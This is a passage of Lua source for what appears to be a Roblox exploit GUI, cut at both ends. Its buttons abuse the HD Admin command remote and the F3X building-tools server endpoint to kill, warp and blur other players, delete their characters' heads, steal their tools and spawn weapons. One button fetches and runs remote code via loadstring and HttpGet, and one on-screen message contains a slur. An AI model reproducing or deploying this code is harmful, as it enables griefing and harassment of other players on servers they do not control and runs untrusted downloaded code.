							Texture = "rbxassetid://" .. asset
						}
					}
				}
				_(args)
			end
	
			function toptexturecreate(part)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture"
						}
					}
				}
	
				_(args)
			end
			function toptextureadd(part)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture",
							["Texture"] = "rbxassetid://18878365966",
							["StudsPerTileV"] = 4,
							["StudsPerTileU"] = 4
						}
					}
				}
				_(args)
			end
	
			local position = CFrame.new(0, -10, 0)
			local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
			resize(base, Vector3.new(1000, 1, 1000), position)
			toptexturecreate(base)
			toptextureadd(base)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Intimidation"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.48,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Intimidation"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";blur others")
			RequestCommandSilent:InvokeServer(";warp others")
	
	
	
		end)
		local title = Instance.new("TextLabel")
		title.Parent = acg
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Admin Command / Guis"
		title.TextColor3 = whit
		local title = Instance.new("TextLabel")
		title.Parent = sd
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Server Destruction"
		title.TextColor3 = whit
		--Page 1 End --
	
	
	
	
		-- Gear/Tools --
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Custom Gear"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Custom Gear"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local gear = frame.Settings.Page1["Custom Gear ID"].TextBox.Text
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";gear me " .. gear)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Stamper Tools"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Stamper Tools"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local x = game:GetService("InsertService"):LoadAsset(73089166)
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove()
			x = game:GetService("InsertService"):LoadAsset(73089204)
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove() 
			x = game:GetService("InsertService"):LoadAsset(73089190) 
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove()
			x = game:GetService("InsertService"):LoadAsset(58880579) 
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove()
			x = game:GetService("InsertService"):LoadAsset(60791062) 
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove()
			x = game:GetService("InsertService"):LoadAsset(73089239) 
			for i,v in pairs(x:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Backpack
			end
			x:Remove()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Tool Stealer"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Tool Stealer"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local z = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack) 
			z.Name = "Tool Stealer"
			function onButton1Down(mouse)
				local hit = mouse.Target
				if (hit == nil) then return end
				for i,v in pairs(hit.Parent:GetChildren()) do
					if v:IsA("Tool") or v:IsA("HopperBin") then
						v.Parent = game.Players.LocalPlayer.Backpack
					end
				end
			end
			function  onSelected(mouse)
				mouse.Button1Down:connect(function() onButton1Down(mouse) end)
			end
	
			z.Selected:connect(onSelected)	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Minigun"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Dev Uzi"
		button.TextColor3 = whit
		button.MouseButton1Down:Connect(function()
	
	
	
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dev-uzi-2016-110953"))()
	
	
			local player = game.Players.LocalPlayer
			local originalChar = player.Character or player.CharacterAdded:Wait()
			local tool
			while player.Character == originalChar do
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function DestroyPart(part)
					spawn(function()
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end)
				end
	
				function AddDecor(part, dec)
					spawn(function()
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = dec
								}
							}
						}
						_(args)
					end)
				end
	
				function a()
					local dist = 17
					local distance = dist
					local Player = game.Players.LocalPlayer
	
					if Player then
						local c = game.Players:GetChildren()
						for i = 1, #c do
							if c[i].Name ~= Player.Name then
								if c[i].Character and c[i].Character:FindFirstChild("Head") then
									local char = c[i].Character
									local torso = game.Workspace[Player.Name]:FindFirstChild("Torso")
									if torso and c[i]:DistanceFromCharacter(torso.Position) <= distance then
										DestroyPart(char:FindFirstChild("Head"))
										for _, part in ipairs(char:GetChildren()) do
											if part:IsA("BasePart") then
												AddDecor(part, "Fire")
											end
										end
									end
								end
							end
						end
					end
				end
	
	
				spawn(a)
				wait()
			end
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "God Laser"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "God Laser"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";gear me 115377964")
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Draw Tool"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Draw Tool"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
			-- Instances: 14 | Scripts: 1 | Modules: 0 | Tags: 0
			local G2L = {};
	
			-- StarterGui.Studio
			G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
			G2L["1"]["Name"] = [[Studio]];
			G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
			-- StarterGui.Studio.Name
			G2L["2"] = Instance.new("TextLabel", G2L["1"]);
			G2L["2"]["BorderSizePixel"] = 0;
			G2L["2"]["TextSize"] = 41;
			G2L["2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["2"]["FontFace"] = Font.new([[rbxassetid://12187375716]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["2"]["TextColor3"] = Color3.fromRGB(235, 235, 235);
			G2L["2"]["BackgroundTransparency"] = 1;
			G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["2"]["Size"] = UDim2.new(0.16098, 0, 0.07567, 0);
			G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["2"]["Text"] = [[F3x Draw FE]];
			G2L["2"]["Name"] = [[Name]];
			G2L["2"]["Position"] = UDim2.new(0.10633, 0, 0.94548, 0);
	
	
			-- StarterGui.Studio.Name.TextLabel
			G2L["3"] = Instance.new("TextLabel", G2L["2"]);
			G2L["3"]["BorderSizePixel"] = 0;
			G2L["3"]["TextSize"] = 30;
			G2L["3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["3"]["FontFace"] = Font.new([[rbxassetid://12187375716]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["3"]["BackgroundTransparency"] = 1;
			G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["3"]["Size"] = UDim2.new(0.16098, 0, 0.07567, 0);
			G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["3"]["Text"] = [[by MoonVM]];
			G2L["3"]["Position"] = UDim2.new(0.08633, 0, 0.85548, 0);
	
	
			-- StarterGui.Studio.Name.UIGradient
			G2L["4"] = Instance.new("UIGradient", G2L["2"]);
			G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 5)),ColorSequenceKeypoint.new(0.230, Color3.fromRGB(222, 255, 3)),ColorSequenceKeypoint.new(0.477, Color3.fromRGB(0, 255, 248)),ColorSequenceKeypoint.new(0.817, Color3.fromRGB(226, 54, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 196))};
	
	
			-- StarterGui.Studio.Name.UIStroke
			G2L["5"] = Instance.new("UIStroke", G2L["2"]);
			G2L["5"]["Color"] = Color3.fromRGB(135, 135, 135);
	
	
			-- StarterGui.Studio.ColorPicker
			G2L["6"] = Instance.new("Frame", G2L["1"]);
			G2L["6"]["BorderSizePixel"] = 0;
			G2L["6"]["BackgroundColor3"] = Color3.fromRGB(85, 85, 85);
			G2L["6"]["Size"] = UDim2.new(0.15856, 0, 0.2951, 0);
			G2L["6"]["Position"] = UDim2.new(0.8226, 0, 0.87343, 0);
			G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["6"]["Name"] = [[ColorPicker]];
	
	
			-- StarterGui.Studio.ColorPicker.ColorExample
			G2L["7"] = Instance.new("Frame", G2L["6"]);
			G2L["7"]["BorderSizePixel"] = 0;
			G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["7"]["Size"] = UDim2.new(0.36475, 0, 0.89128, 0);
			G2L["7"]["Position"] = UDim2.new(0.15, 0, 0.5, 0);
			G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["7"]["Name"] = [[ColorExample]];
	
	
			-- StarterGui.Studio.ColorPicker.ColorExample.UIAspectRatioConstraint
			G2L["8"] = Instance.new("UIAspectRatioConstraint", G2L["7"]);
	
	
	
			-- StarterGui.Studio.ColorPicker.ColorExample.UIStroke
			G2L["9"] = Instance.new("UIStroke", G2L["7"]);
			G2L["9"]["Thickness"] = 2.1;
	
	
			-- StarterGui.Studio.ColorPicker.UIAspectRatioConstraint
			G2L["a"] = Instance.new("UIAspectRatioConstraint", G2L["6"]);
			G2L["a"]["AspectRatio"] = 3.39;
	
	
			-- StarterGui.Studio.ColorPicker.UIStroke
			G2L["b"] = Instance.new("UIStroke", G2L["6"]);
			G2L["b"]["Thickness"] = 4.2;
	
	
			-- StarterGui.Studio.ColorPicker.ColorSet
			G2L["c"] = Instance.new("TextBox", G2L["6"]);
			G2L["c"]["CursorPosition"] = -1;
			G2L["c"]["Name"] = [[ColorSet]];
			G2L["c"]["BorderSizePixel"] = 0;
			G2L["c"]["TextWrapped"] = true;
			G2L["c"]["TextSize"] = 14;
			G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["c"]["BackgroundColor3"] = Color3.fromRGB(54, 54, 54);
			G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["c"]["PlaceholderText"] = [[Color3.new(0,0,0) --- example]];
			G2L["c"]["Size"] = UDim2.new(0.0, 0, 0.0, 0);
			G2L["c"]["Position"] = UDim2.new(0.38594, 0, 0.03715, 0);
			G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["c"]["Text"] = [[]];
	
	
			-- StarterGui.Studio.ColorPicker.ColorSet.UIStroke
			G2L["d"] = Instance.new("UIStroke", G2L["c"]);
			G2L["d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
			G2L["d"]["Thickness"] = 2.1;
	
	
			-- StarterGui.Studio.ColorPicker.LocalScript
			G2L["e"] = Instance.new("LocalScript", G2L["6"]);
	
	
	
			-- StarterGui.Studio.ColorPicker.LocalScript
			local function C_e()
				local script = G2L["e"];
				local ColorSet = script.Parent.ColorSet 
				local ColorExample = script.Parent.ColorExample
				local Player = game.Players.LocalPlayer
				local Char = Player.Character or Player.CharacterAdded:Wait()
				local mouse = Player:GetMouse()
				local Holding = false
				local hrp = Char:WaitForChild("HumanoidRootPart")
				local SharedAble = {}
	
				local RunService = game:GetService("RunService")
	
	
	
	
				ColorSet:GetPropertyChangedSignal("Text"):Connect(function()
					local success, color = pcall(function()
						local parts = {}
						for part in string.gmatch(ColorSet.Text, "[^,]+") do
							table.insert(parts, tonumber(part))
						end
	
						if #parts == 3 then
							if parts[1] > 1 or parts[2] > 1 or parts[3] > 1 then
								return Color3.fromRGB(parts[1], parts[2], parts[3])
							else
								return Color3.new(parts[1], parts[2], parts[3])
							end
						end
	
						return Color3.new(1, 1, 1)
					end)
	
					if success and color then
						ColorExample.BackgroundColor3 = color
						SharedAble._Color = color
					end
				end)
	
				function GetF3x()
					for _, v in pairs(Player.Backpack:GetChildren()) do
						if v:IsA("Tool") then
							return v
						end
					end
					for _, v in pairs(Char:GetChildren()) do
						if v:IsA("Tool") then
							return v
						end
					end
				end
	
				local F3x = GetF3x()
	
				if F3x then
					function InvokeIt(actionName, ...)
						return F3x.SyncAPI.ServerEndpoint:InvokeServer(actionName, ...)
					end
	
					local function resize(part, size, cf)
						InvokeIt("SyncResize", {
							{
								Part = part,
								CFrame = cf,
								Size = size
							}
						})
					end
	
					local conn
	
					mouse.Button1Down:Connect(function()
						Holding = true
						conn = RunService.RenderStepped:Connect(function()
							if not Holding then return end
	
							local MousePos = mouse.Hit
	
							local part = InvokeIt("CreatePart", "Normal", CFrame.new(MousePos.Position), game.Workspace)
	
							if part then
								resize(part, Vector3.new(1,1,1), part.CFrame)
	
								InvokeIt("SyncColor", {
									{
										Part = part,
										Color = ColorExample.BackgroundColor3
									}
								})
							end
						end)
					end)
	
					mouse.Button1Up:Connect(function()
						Holding = false
						if conn then
							conn:Disconnect()
							conn = nil
						end
					end)
				end
	
				game.TextChatService.TextChannels.RBXGeneral:SendAsync("<"..Player.Name.."> F3X Draw By MoonVM")
			end;
			task.spawn(C_e);
	
			return G2L["1"], require;
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 3
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = gt
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
	
	
		-- Weapon Scripts --
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Drage"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Drage"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 243778818")
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Dual Blades"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Dual Blades"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 158069180")
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Eyelaser"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Eyelaser"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			--MADE BY OneLegend (NOT THE SCRIPT) LOCAL SCRIPT: Go to line 4 and put your name where it says "YOUR NAME HERE"
	
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
			local head = char:WaitForChild("Head")
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			-- หา SyncAPI
			local sync, syncTool
			for _,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					sync = v
					syncTool = v.Parent
				end
			end
			if not sync then
				warn("❌ ไม่พบ SyncAPI!")
				return
			end
	
			local endpoint = sync.ServerEndpoint
			local mouse = player:GetMouse()
	
			-- ยิงเลเซอร์ออกจากตา
			local function fireLaser(targetPos)
				local leftEye = head.Position + (head.CFrame.RightVector * -0.2) + (head.CFrame.UpVector * -0.1)
				local rightEye = head.Position + (head.CFrame.RightVector * 0.2) + (head.CFrame.UpVector * -0.1)
				local origins = {leftEye, rightEye}
	
				for _, origin in ipairs(origins) do
					local dir = (targetPos - origin).Unit
					local distance = (targetPos - origin).Magnitude
	
					endpoint:InvokeServer("CreatePart", "Normal", CFrame.new(origin), workspace)
	
					local laser
					for _, obj in ipairs(workspace:GetChildren()) do
						if obj:IsA("Part") and (obj.Position - origin).Magnitude < 1 then
							laser = obj
						end
					end
	
					if laser then
						laser.Anchored = true
						laser.Material = Enum.Material.Neon
						laser.Color = Color3.new(1, 0, 0)
						laser.Size = Vector3.new(0.05, 0.05, distance)
						laser.CFrame = CFrame.lookAt(origin, targetPos) * CFrame.new(0, 0, -distance/2)
						game.Debris:AddItem(laser, 0.4)
					end
				end
	
				-- ตรวจจับโดนคน
				local ray = Ray.new(head.Position, (targetPos - head.Position).Unit * 500)
				local hit, pos = workspace:FindPartOnRay(ray, char)
				if hit and hit.Parent:FindFirstChildOfClass("Humanoid") then
					local hitPlr = game.Players:GetPlayerFromCharacter(hit.Parent)
					if hitPlr then
						rq:InvokeServer(";kill "..hitPlr.Name)
					end
				end
			end
	
			-- หมุนทั้งตัวตามเมาส์แบบช้า
			game:GetService("RunService").RenderStepped:Connect(function()
				local pos = hrp.Position
				local look = Vector3.new(mouse.Hit.Position.X, pos.Y, mouse.Hit.Position.Z) -- รักษาความสูง
				hrp.CFrame = CFrame.new(pos, look)
			end)
	
			-- ยิงเลเซอร์เมื่อคลิก
			mouse.Button1Down:Connect(function()
				fireLaser(mouse.Hit.Position)
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Knife"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Knife"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand	RequestCommand:InvokeServer(";r6 @") -- U can change all of it with your commands!
	
			RequestCommand:InvokeServer(";buildingTools ")
	
			local player = game.Players.LocalPlayer
	
			local character = player.Character or player.CharacterAdded:Wait()
	
			local RunService = game:GetService("RunService")
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
	
			local Players = game:GetService("Players")
	
			local UserInputService = game:GetService("UserInputService")
	
			if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
	
				ready = false
	
				local function notify(msg)
	
					local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
	
					if not MainGUI then
	
						MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
	
						MainGUI.Name = "MainGUI"
	
					end
	
					coroutine.wrap(function()
	
						for _, v in pairs(MainGUI:GetChildren()) do
	
							if v:IsA("TextLabel") then v:Destroy() end
	
						end
	
						local TextLabel = Instance.new("TextLabel")
	
						local Frame = Instance.new("Frame")
	
						TextLabel.Parent = MainGUI
	
						TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	
						TextLabel.BorderSizePixel = 0
	
						TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
	
						TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
	
						TextLabel.Font = Enum.Font.SourceSans
	
						TextLabel.TextColor3 = Color3.new(1, 1, 1)
	
						TextLabel.TextSize = 35
	
						TextLabel.TextScaled = true
	
						TextLabel.TextYAlignment = Enum.TextYAlignment.Center
	
						TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	
						TextLabel.Text = ""
	
						TextLabel.BackgroundTransparency = 1
	
						Frame.Parent = TextLabel
	
						Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
	
						Frame.BorderSizePixel = 0
	
						Frame.Transparency = 1
	
						Frame.Position = UDim2.new(0, 0, 1, 0)
	
						Frame.Size = UDim2.new(1, 0, 0, 5)
	
						for i = 1, 8 do
	
							TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
	
							TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
	
							Frame.Transparency = Frame.Transparency - 0.1
	
							task.wait()
	
						end
	
						msg = "  || " .. msg
	
						for i = 1, #msg do
	
							TextLabel.Text = string.sub(msg, 1, i)
	
							task.wait()
	
						end
	
						task.wait(1)
	
						for i = 1, 8 do
	
							TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
	
							TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
	
							Frame.Transparency = Frame.Transparency + 0.1
	
							task.wait()
	
						end
	
						TextLabel:Destroy()
	
					end)()
	
				end
	
				RequestCommand:InvokeServer(";hat me 18268136683")
	
				yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
	
				if yeah then
	
					notify("THIS WORK F3X GAME LMAO FAGGOT ")
	
					task.wait(3)
	
					notify("Let use! for Fun!")
	
				elseif not yeah then
	
					notify("LOL this game has no btools or f3x so this not gonna work here")
	
				end
	
				local tool
	
				for _, v in player:GetDescendants() do
	
					if v.Name == "SyncAPI" then
	
						tool = v.Parent
	
					end
	
				end
	
				for _, v in game.ReplicatedStorage:GetDescendants() do
	
					if v.Name == "SyncAPI" then
	
						tool = v.Parent
	
					end
	
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
	
				function _(args)
	
					remote:InvokeServer(unpack(args))
	
				end
	
				function SetCollision(part, boolean)
	
					local args = {
	
						[1] = "SyncCollision",
	
						[2] = {
	
							[1] = {
	
								["Part"] = part,
	
								["CanCollide"] = boolean
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function SetLocked(part,boolean)
	
					local args = {
	
						[1] = "SetLocked",
	
						[2] = {
	
							[1] = part
	
						},
	
						[3] = boolean
	
					}
	
					_(args)
	
				end
	
				function yerpp(E)
	
					local argsCreate = {
	
						[1] = "CreateDecorations",
	
						[2] = {
	
							[1] = {
	
								["Part"] = E,
	
								["DecorationType"] = "Sparkles"
	
							}
	
						}
	
					}
	
	
	
					local argsSync = {
	
						[1] = "SyncDecorate",
	
						[2] = {
	
							[1] = {
	
								["Part"] = E,
	
								["DecorationType"] = "Sparkles",
	
								["SparkleColor"] = Color3.fromRGB(255, 255, 0)
	
							} 
	
						} 
	
					}
	
					_(argsCreate)
	
					_(argsSync)
	
				end
	
				local knfe = character["Accessory (Knife McGrabbington III)"]
	
				if knfe then
	
					local args = {
	
